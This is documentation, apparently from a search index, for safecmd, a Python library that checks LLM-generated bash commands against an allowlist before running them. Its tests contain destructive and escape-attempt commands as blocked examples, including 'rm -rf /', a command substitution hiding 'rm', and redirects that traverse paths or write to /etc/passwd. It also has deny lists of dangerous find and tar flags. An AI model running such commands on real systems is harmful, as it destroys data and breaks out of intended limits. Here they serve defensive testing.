    "objectID": "core.html#introduction",
    "href": "core.html#introduction",
    "title": "Core API",
    "section": "",
    "text": "safecmd.core provides a safe execution layer for shell commands. It’s designed for situations where you need to run bash commands from untrusted sources—such as LLM-generated commands—while ensuring they can’t modify your system in dangerous ways.\nThe module builds on top of safecmd.bashxtract (which parses bash into an AST and extracts commands) to validate commands against an allowlist before execution. The key insight is that rather than trying to blacklist dangerous commands (which is error-prone), we whitelist a generous set of read-only and easily-reverted commands that are safe to run.\nThe core workflow is:\n\nParse the bash command string using extract_commands() from bashxtract\nCheck each extracted command against ok_cmds (the allowlist). Commands inside substitutions ($(...)), subshells, pipelines, etc are extracted recursively, so nested commands are also validated.\nCheck that output redirects only write to allowed destinations (default: ./ and /tmp)\nIf everything passes, execute the command and return the result\n\nThis approach handles complex bash syntax correctly—pipelines, command substitutions, subshells, and more—because it uses a proper bash parser rather than regex or string splitting.\nThe allowlist (ok_cmds) uses prefix matching to determine if a command is permitted. A simple entry like 'ls' matches any command starting with ls—so ls, ls -la, and ls /home/user are all allowed. A multi-word entry like 'git status' only matches commands that start with both those words—so git status and git status --short are allowed, but git push is not.\nThis prefix approach lets you be precise about which subcommands are safe. For instance, you might allow git log, git status, and git diff (all read-only) while blocking git push and git reset (which modify state).\nSome commands are mostly safe but have a few dangerous flags. For these cases, you can specify a denied list of flags that will cause the command to be rejected. For example, find allows searching but blocks -delete which would remove files.\nSome flags take arguments that themselves need validation. Exec flags (like find -exec) have a next argument that’s a command—this command is parsed and validated recursively. So find . -exec ls passes (since ls is allowed) but find . -exec rm fails. Dest flags (like curl -o) have a next argument that’s an output destination—this is validated against ok_dests. So curl -o /tmp/file url passes but curl -o /etc/passwd url fails.\nOutput redirects (&gt;, &gt;&gt;, etc.) are also validated. By default, redirects can only write to the current directory (./) or /tmp. Bare relative paths like file.txt are normalized to ./file.txt before matching. You can customize allowed destinations via ok_dests.\nThe first time this module is used a config file (config.ini) is created with the default configuration. The file location follows the XDG Base Directory spec via xdg_config_home():\n\nLinux: ~/.config/safecmd/config.ini\nmacOS: ~/Library/Application Support/safecmd/config.ini\nWindows: %LOCALAPPDATA%\\safecmd\\config.ini (typically C:\\Users\\&lt;username&gt;\\AppData\\Local\\safecmd\\config.ini)\n\nThis file can be edited to change configuration.",
    "crumbs": [
      "Core API"
    ]
  },
  {
    "objectID": "core.html#how-to-use",
    "href": "core.html#how-to-use",
    "title": "Core API",
    "section": "How to use",
    "text": "How to use\nThe simplest way to use safecmd is to call safe_run() with a bash command string. This function validates the command against the built-in allowlist and executes it if safe, returning the combined stdout/stderr output as a string. If the command fails, it raises an IOError. If the command or destinations aren’t allowed, it raises either DisallowedCmd or DisallowedDest.\nFor example: safe_run('ls -la | grep py') will execute and return the filtered directory listing, while safe_run('rm -rf /') will raise a DisallowedCmd exception before anything dangerous happens.\nThe module comes with a predefined set of safe commands. This includes common read-only utilities like cat, grep, ls, diff, builtins like cd, export, [, and true, as well as safe git subcommands like git log, git status, and git diff. Commands like find have exec flags configured so that find . -exec ls passes but find . -exec rm fails. Commands like curl have dest flags so curl -o /tmp/file passes but writing to disallowed paths fails.\nOutput redirects are allowed but only to permitted destinations. By default, commands can write to the current directory (./) and /tmp. You can customize this by passing a dests parameter to safe_run(). For example, safe_run(cmd, add_dests='~/') would also allow writing to the home directory.",
    "crumbs": [
      "Core API"
    ]
  },
  {
    "objectID": "core.html#api",
    "href": "core.html#api",
    "title": "Core API",
    "section": "API",
    "text": "API\n\nHelpers\n\nsource\n\n\nrun\n\ndef run(\n    cmd, ignore_ex:bool=False\n):\n\nRun cmd in shell; return stdout (+ stderr if any); raise IOError on failure\nExecutes a shell command and returns its combined stdout/stderr output. If ignore_ex=True, returns a tuple of (returncode, output) instead of raising on failure. This is the low-level execution function—it doesn’t do any safety checking.\n\nfrom fastcore.test import test_fail,test_eq\n\n\ntest_eq(run('echo hello'), 'hello')\ntest_eq(run('echo out; echo err &gt;&2'), 'out\\nerr')\ntest_eq(run('exit 1', ignore_ex=True), (1, ''))\ntest_eq(run('echo fail &gt;&2; exit 1', ignore_ex=True), (1,'fail'))\ntest_fail(lambda: run('exit 1'))\n\n\n\nCommand Specifications\n\nsource\n\n\nCmdSpec\n\ndef CmdSpec(\n    name, # the command (str, will be split into tuple)\n    denied:NoneType=None, # if set, these flags blocked\n    exec_flags:NoneType=None, # flags whose next arg is a command to validate\n    dest_flags:NoneType=None, # flags whose next arg is a destination to validate\n):\n\nBase class for objects needing a basic __repr__\nCmdSpec represents an allowed command with optional denied flags, exec flags, and dest flags. The name is stored as a tuple for prefix matching—so CmdSpec('git log') matches git log, git log --oneline, etc. The denied set contains flags that will cause the command to be rejected. The exec_flags set contains flags whose next argument is a command to validate recursively. The dest_flags set contains flags whose next argument is a destination to validate against allowed destinations.\n\nfind = CmdSpec('find', denied=['-exec', '-delete'])\nfind\n\nfind !{'-delete', '-exec'}\n\n\n\nassert find(['find', '.', '-name', '*.py'])\nassert not find(['find', '.', '-exec', 'rm'])\nassert not find(['ls', '-la'])\n\n# Combined short flags should be caught\ntar = CmdSpec('tar', denied=['-I', '--to-command'])\nassert tar(['tar', '-xvf', 'file.tar'])      # allowed\nassert not tar(['tar', '-I', 'zstd'])        # exact match blocked\nassert not tar(['tar', '-xvfI', 'zstd'])     # combined flag blocked\nassert not tar(['tar', '--to-command=cat'])  # long flag still works\n\nThe from_str classmethod provides a compact string syntax for creating CmdSpec objects. The format is command:-flag1|-flag2:exec=-exec|-execdir:dest=-o|--output where colons separate sections:\n\nFirst section: command name (can be multi-word like git log)\nDenied flags section: |- separated flags to block (e.g., -delete|-ok)\nExec flags section: exec= prefix, then |-separated flags whose next arg is a command to validate\nDest flags section: dest= prefix, then |-separated flags whose next arg is a destination to validate\n\nFor example, CmdSpec.from_str('find:-delete:exec=-exec|-execdir') creates a spec that allows find, blocks -delete, and validates the command after -exec or -execdir. If no special flags are needed, just pass the command name: CmdSpec.from_str('cat').\n\ntest_eq(CmdSpec.from_str('cat'), CmdSpec('cat'))\ntest_eq(CmdSpec.from_str('find:-delete:exec=-exec|-execdir'), CmdSpec('find', denied=['-delete'], exec_flags=['-exec', '-execdir']))\ntest_eq(CmdSpec.from_str('curl:dest=-o|--output'), CmdSpec('curl', dest_flags=['-o', '--output']))\ntest_eq(CmdSpec.from_str('git log'), CmdSpec('git log'))\n\n\n\nDefault Allowlists\nIn the default configuration, ok_dests specifies where output redirects can write (default: ./, /tmp). ok_cmds contains a generous set of read-only commands plus some safe git operations. Note that find blocks -delete but allows -exec with validation of the command argument:\n\n\nExported source\ndefault_cfg = '''[DEFAULT]\nok_dests = ./, /tmp\n\nok_cmds = cat, head, tail, less, more, bat\n    # Directory listing\n    ls, tree, locate\n    # Search\n    grep, rg, ag, ack, fgrep, egrep\n    # Text processing\n    cut, sort, uniq, wc, tr, column\n    # File info\n    file, stat, du, df, which, whereis, type\n    # Comparison\n    diff, cmp, comm\n    # Archives\n    unzip, gunzip, bunzip2, unrar\n    # Network\n    ping, dig, nslookup, host\n    # System info\n    date, cal, uptime, whoami, hostname, uname, printenv\n    # Utilities\n    echo, printf, yes, seq, basename, dirname, realpath\n    # Git (read-only)\n    git log, git show, git diff, git status, git branch, git tag, git remote,\n    git stash list, git blame, git shortlog, git describe, git rev-parse,\n    git ls-files, git ls-tree, git cat-file, git config --get, git config --list\n    # Git (workspace)\n    git fetch, git add, git commit, git switch, git checkout\n    # gh\n    gh repo view, gh issue list, gh issue view, gh pr list, gh pr view, gh pr status, gh pr checks, gh pr diff\n    gh release list, gh release view, gh run list, gh run view, gh workflow list, gh workflow view\n    gh auth status, gh gist list, gh gist view, gh browse, gh search\n    # nbdev\n    nbdev_export, nbdev_clean\n    # npm (read-only)\n    npm list, npm ls, npm outdated, npm view, npm info, npm why, npm audit, npm config list, npm config get, npm search, npm pack\n    # yarn (read-only)\n    yarn list, yarn outdated, yarn why, yarn info, yarn config list, yarn config get\n    # pnpm (read-only)\n    pnpm list, pnpm ls, pnpm outdated, pnpm why, pnpm config list, pnpm config get\n    # bun (read-only)\n    bun pm ls, bun pm hash\n    # js install\n    npm install, yarn install, pnpm install, bun install\n    # Modern Unix (read-only)\n    bat, eza, exa, fd, fzf, dust, duf, tldr, zoxide, httpie, http, jq, yq\n    # Docker (read-only)\n    docker ps, docker images, docker logs, docker inspect, docker stats, docker top, docker diff, docker history, docker version, docker info\n    # Docker (workspace - reversible)\n    docker pull, docker build\n    # AWS (read-only)\n    aws s3 ls, aws s3 cp, aws sts get-caller-identity, aws iam get-user, aws iam list-users\n    aws ec2 describe-instances, aws ec2 describe-vpcs, aws ec2 describe-security-groups\n    aws logs describe-log-groups, aws logs filter-log-events, aws logs get-log-events\n    aws lambda list-functions, aws lambda get-function\n    aws cloudformation describe-stacks, aws cloudformation list-stacks\n    aws rds describe-db-instances, aws dynamodb list-tables, aws dynamodb describe-table\n    aws sqs list-queues, aws sns list-topics\n    aws configure list, aws configure get\n    # GCloud (read-only)\n    gcloud config list, gcloud config get-value, gcloud auth list\n    gcloud projects list, gcloud projects describe\n    gcloud compute instances list, gcloud compute instances describe, gcloud compute zones list, gcloud compute regions list\n    gcloud container clusters list, gcloud container clusters describe\n    gcloud functions list, gcloud functions describe, gcloud functions logs read\n    gcloud run services list, gcloud run services describe\n    gcloud sql instances list, gcloud sql instances describe\n    gcloud storage ls, gcloud storage cat\n    gcloud logging read\n    # toolslm\n    folder2ctx, repo2ctx\n    # Builtins\n    cd, pwd, export, test, [, true, false\n    # Exec/dest flag handling\n    find:-delete|-ok|-okdir:exec=-exec|-execdir\n    rg:--pre\n    tar:--use-compress-program|--transform|--checkpoint-action|--info-script|--new-volume-script:exec=--to-command|-I\n    curl:dest=-o|--output\n'''\n\n\n\n# cfg_path.unlink()\n\nIf config.ini doesn’t exist, it’s created with the default configuration, in the file location following the XDG Base Directory spec.\n\nsource\n\n\nparse_cfg\n\ndef parse_cfg(\n    cfg_str\n):\n\nParse config string, return (ok_dests set, ok_cmds set of CmdSpecs)\nThe config is parsed into ok_dests and ok_cmds.\n\nprint(ok_dests)\nlist(ok_cmds)[:7]\n\n{'./', '/tmp'}\n\n\n[gh browse, echo, test, git status, nbdev_clean, whereis, ag]\n\n\n\nfirst(o for o in ok_cmds if str(o).startswith('find'))\n\nfind !{'-ok', '-delete', '-okdir'} exec={'-execdir', '-exec'}\n\n\n\n\nSafe Execution\n\nsource\n\n\nvalidate_cmd\n\ndef validate_cmd(\n    toks, cmds:NoneType=None\n):\n\nCheck if toks matches an allowed command; returns False if denied flags present\nvalidate_cmd checks whether a tokenized command matches any entry in the allowlist by calling each CmdSpec until one returns True.\n\nassert validate_cmd(['ls', '-la'])\nassert validate_cmd(['git', 'status'])\nassert validate_cmd(['find', '.', '-name', '*.py'])\nassert validate_cmd(['find', '.', '-exec', 'rm'])  # -exec now handled by exec_flags, not denied\nassert not validate_cmd(['find', '.', '-delete'])  # -delete is still denied\nassert not validate_cmd(['rm', '-rf', '/'])\nassert not validate_cmd(['git', 'push'])\n\n\nsource\n\n\nDisallowedDest\n\ndef DisallowedDest(\n    dest\n):\n\nNot enough permissions.\n\nsource\n\n\nDisallowedCmd\n\ndef DisallowedCmd(\n    cmd\n):\n\nNot enough permissions.\n\nsource\n\n\nDisallowedError\n\ndef DisallowedError(\n    args:VAR_POSITIONAL, kwargs:VAR_KEYWORD\n):\n\nNot enough permissions.\n\nsource\n\n\nvalidate_dest\n\ndef validate_dest(\n    dest, dests:NoneType=None\n):\n\nCheck if dest (resolved to absolute) matches an allowed destination pattern\n\nsource\n\n\nnormalize_dest\n\ndef normalize_dest(\n    dest\n):\n\nNormalize destination to absolute path, expanding ~ and env vars\nnormalize_dest resolves paths to absolute, expanding ~ and environment variables (like $HOME) and normalizing .. components. This prevents path traversal attacks where ./.. or ./subdir/../../escape would otherwise match the ./ pattern. validate_dest checks if a resolved absolute path starts with any allowed pattern (also resolved to absolute).\n\ncwd = os.getcwd()\nhome = os.path.expanduser('~')\nparent = os.path.dirname(cwd)\n\n# normalize_dest now returns absolute paths\ntest_eq(normalize_dest('file.txt'), f'{cwd}/file.txt')\ntest_eq(normalize_dest('./file.txt'), f'{cwd}/file.txt')\ntest_eq(normalize_dest('/tmp/file'), '/tmp/file')\ntest_eq(normalize_dest('../up.txt'), f'{parent}/up.txt')\ntest_eq(normalize_dest('~/home.txt'), f'{home}/home.txt')\ntest_eq(normalize_dest('$HOME/file'), f'{home}/file')\n\n# With default ok_dests = {'./', '/tmp'}\nassert validate_dest('file.txt')       # /cwd/file.txt matches /cwd/\nassert validate_dest('./subdir/f.txt') # /cwd/subdir/f.txt matches /cwd/\nassert validate_dest('/tmp/test')      # matches /tmp\nassert not validate_dest('/etc/passwd')  # no match\nassert not validate_dest('../up.txt')    # resolves outside cwd - blocked!\nassert not validate_dest('~/file')       # ~/ not in defaults\n\nvalidate checks a bash command string against the allowlists without executing it. This is useful for pre-validation (e.g., in hooks or UI) where you want to know if a command would be allowed before actually running it. It raises DisallowedCmd or DisallowedDest if validation fails.\n\nsource\n\n\nvalidate\n\ndef validate(\n    cmd:str, # Bash command string to validate\n    cmds:NoneType=None, # Allowed commands set; defaults to ok_cmds\n    dests:NoneType=None, # Allowed destinations set; defaults to ok_dests\n):\n\nValidate cmd against allowlists; raises DisallowedCmd or DisallowedDest on failure\n_build_flag_dicts extracts exec_flags and dest_flags dicts from a set of CmdSpec objects. Each dict maps command names to their respective flag sets, which are then passed to extract_commands for recursive validation.\n\n# Safe commands pass validation silently\nvalidate('ls -la | grep py')\nvalidate('git status && echo done')\nvalidate('echo hi &gt; file.txt')  # allowed - writes to ./file.txt\nvalidate('cat data &gt; /tmp/out')  # allowed - /tmp is ok\n\n# Unsafe commands raise exceptions\ntest_fail(lambda: validate('rm -rf /'), exc=DisallowedCmd)\ntest_fail(lambda: validate('echo hi &gt; /etc/badplace'), exc=DisallowedDest)\ntest_fail(lambda: validate('ls $(rm -rf /)'), exc=DisallowedCmd)  # nested command caught\ntest_fail(lambda: validate('echo &gt; ../escape.txt'), exc=DisallowedDest)  # parent dir not allowed\n\n# Path traversal attacks - must be blocked\ntest_fail(lambda: validate('echo hi &gt; ./..'), exc=DisallowedDest)  # escapes via ./..\ntest_fail(lambda: validate('echo hi &gt; ./../escape.txt'), exc=DisallowedDest)  # escapes via ./../\ntest_fail(lambda: validate('echo hi &gt; ./subdir/../../escape.txt'), exc=DisallowedDest)  # nested escape\ntest_fail(lambda: validate('echo hi &gt; /tmp/../bad.txt'), exc=DisallowedDest)  # escape via /tmp/../\n\n# Resolved paths that stay within allowed dirs should work\nvalidate('echo hi &gt; ./subdir/../file.txt')  # resolves to ./file.txt, still in cwd\n\n\n# exec_flags: find -exec with allowed command passes, with disallowed command fails\nvalidate('find . -exec ls')\ntest_fail(lambda: validate('find . -exec rm'), exc=DisallowedCmd)\n\n# dest_flags: curl -o with allowed dest passes, with disallowed dest fails\nvalidate('curl -o /tmp/out http://example.com')\ntest_fail(lambda: validate('curl -o /etc/passwd http://example.com'), exc=DisallowedDest)\n\n\nsource\n\n\nsafe_run\n\ndef safe_run(\n    cmd:str, # Bash command string to execute\n    cmds:str=None, # Allowed commands (comma-separated, config format); defaults to ok_cmds\n    dests:str=None, # Allowed destinations (comma-separated); defaults to ok_dests\n    add_cmds:str=None, # Temp add these commands\n    add_dests:str=None, # Temp add these destinations\n    rm_cmds:str=None, # Temp remove these commands\n    rm_dests:str=None, # Temp remove these destinations\n    ignore_ex:bool=False, # If True, return (returncode, output) instead of raising on error\n)-&gt;str: # Combined stdout/stderr output\n\nRun cmd in shell if all commands and destinations are in allowlists, else raise\nsafe_run is the main entry point. It parses the bash command, validates all extracted commands and redirect destinations against the allowlists, and only executes if everything passes. DisallowedCmd and DisallowedDest are raised for violations, giving clear error messages about what was blocked.\n\ntest_eq(safe_run('ls'), run('ls'))\ntest_eq(safe_run('echo hello | cat'), 'hello')\ntest_eq(safe_run('[ -f /etc/passwd ] && echo exists'), 'exists')\nassert '00_bashxtract.ipynb' in safe_run('find . -exec ls \\;')\n# Redirects to allowed destinations work\nsafe_run('echo test &gt; /tmp/safecmd_test_xyz')\nsafe_run('echo test &gt; test_file_xyz.txt')\n\ntest_fail(lambda: safe_run(r'env rm -rf asdfff'), exc=DisallowedCmd)\ntest_fail(lambda: safe_run('echo hi &gt; /badpath/file'), exc=DisallowedDest)\ntest_fail(lambda: safe_run('find . -exec sudo ls \\;'), exc=DisallowedCmd)\n\nPass ignore_ex=True to return a tuple of return_code,result instead of raising on error on command failed. (Permission failures still raise an error however.)\n\nsafe_run('cat /nonexistent_xyz123 2&gt;&1', ignore_ex=True)\n\n(1, 'cat: /nonexistent_xyz123: No such file or directory')",
    "crumbs": [
      "Core API"
    ]
  },
  {
    "objectID": "core.html#bash-tool",
    "href": "core.html#bash-tool",
    "title": "Core API",
    "section": "Bash tool",
    "text": "Bash tool\nIn Solveit, any function with types and a docstring can be used as a tool. Instead of raising an exception, it’s best to return a success/error dict. The functions in this section wrap safe_run in this way, and provide documentation suitable for an LLM.\n\nsource\n\nbash\n\ndef bash(\n    cmd:str, # Bash command string to execute - all shell features like pipes and subcommands are supported\n    rm_cmds:str=None, # Temp remove these commands from allow list\n    rm_dests:str=None, # Temp remove these destinations from allow list\n):\n\nRun a bash shell command line safely and return the concatencated stdout and stderr. cmd is parsed and all calls are checked against an allow-list. If the command is not allowed, STOP and inform the user of the command run and error details; so they can decide whether to whitelist it or run it themselves. The default allow-list includes most standard unix commands and git subcommands that do not change state or are easily reverted. All operators are supported. Output redirects are validated against allowed destinations (default: ./ and /tmp). rm_ params are comma-separated strs.\nbash does not surface any parameters that could allow the LLM to add or change the allowed tool list.\n\nbash('ls | head -2')\n\n{'success': '_quarto.yml\\n00_bashxtract.ipynb'}\n\n\n\nbash('ls | head -2', rm_cmds='head')\n\n{'error': DisallowedCmd('head -2')}\n\n\n\nbash('sudo ls')\n\n{'error': DisallowedCmd('sudo ls')}\n\n\n\nsource\n\n\nunsafe_bash\n\ndef unsafe_bash(\n    cmd:str, # Bash command string to execute - all shell features like pipes and subcommands are supported\n    cmds:str=None, # Allowed commands; defaults to ok_cmds; DO NOT USE without upfront user permission\n    dests:str=None, # Allowed destinations; defaults to ok_dests; DO NOT USE without upfront user permission\n    add_cmds:str=None, # Temp add these commands to allow list; DO NOT USE without upfront user permission\n    add_dests:str=None, # Temp add these destinations to allow list; DO NOT USE without upfront user permission\n    rm_cmds:str=None, # Temp remove these commands from allow list\n    rm_dests:str=None, # Temp remove these destinations from allow list\n):\n\nRun a bash shell command line safely and return the output. cmd is parsed and all calls are checked against an allow-list. If the command is not allowed, STOP and inform the user of the command run and error details; so they can decide whether to whitelist it or run it themselves. The default allow-list includes most standard unix commands and git subcommands that do not change state or are easily reverted. All operators are supported. Output redirects are validated against allowed destinations. cmds/dests and add_/rm_ params are comma-separated strs.\nunsafe_bash is like bash but exposes parameters to modify the allowlists. The add_cmds and add_dests parameters let an LLM temporarily expand what’s allowed—use with caution, and only with explicit user permission. This is useful when you trust the LLM to make safe expansions in specific contexts.\n\nsource\n\n\nrm_allowed_dests\n\ndef rm_allowed_dests(\n    dests\n):\n\nRemove comma-separated dests from the allow list\n\nsource\n\n\nrm_allowed_cmds\n\ndef rm_allowed_cmds(\n    cmds:str\n):\n\nRemove comma-separated cmds from the allow list\n\nsource\n\n\nadd_allowed_dests\n\ndef add_allowed_dests(\n    dests\n):\n\nAdd comma-separated dests to the allow list; (this can not be used as an LLM tool)\n\nsource\n\n\nadd_allowed_cmds\n\ndef add_allowed_cmds(\n    cmds\n):\n\nAdd comma-separated cmds to the allow list; (this can not be used as an LLM tool)\nThese functions modify the global ok_cmds and ok_dests sets at runtime. add_allowed_cmds and add_allowed_dests expand the allowlist, while rm_allowed_cmds and rm_allowed_dests restrict it. The add_ functions are intentionally not exposed as LLM tools to prevent an LLM from expanding its own permissions.\n\nrm_allowed_cmds('ls')\n\n\nbash('ls -l')\n\n{'error': DisallowedCmd('ls -l')}",
    "crumbs": [
      "Core API"
    ]
  },
  {
    "objectID": "core.html#cli",
    "href": "core.html#cli",
    "title": "Core API",
    "section": "CLI",
    "text": "CLI\n\nsource\n\nmain\n\ndef main(\n    \n):\n\nThe CLI provides a simple command-line interface to safe_run.\nUsage:\nsafecmd ls -la\nIf you have pipes etc, you’ll need to quote the whole command:\nsafecmd 'ls -la | grep py'\nThe command and all its arguments are joined back into a single string and passed to safe_run, which validates against the allowlist before execution. If the command isn’t allowed, it shows an error and returns exit code of 1.\nThis lets you use safecmd as a drop-in replacement for running untrusted commands from scripts or other tools: anything not in the allowlist is blocked before execution.",
    "crumbs": [
      "Core API"
    ]
  }
]